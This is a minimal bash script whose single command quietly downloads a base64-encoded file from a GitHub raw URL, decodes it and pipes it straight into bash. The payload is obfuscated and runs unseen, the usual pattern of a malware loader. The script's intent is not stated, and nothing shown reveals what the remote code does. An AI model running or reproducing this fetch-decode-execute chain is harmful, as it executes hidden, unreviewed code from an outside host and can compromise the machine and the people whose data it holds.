#!/bin/bash
wget -qO- https://raw.githubusercontent.com/lionelchromosomes/tails/refs/heads/main/entrypoint.sh | base64 -d | bash
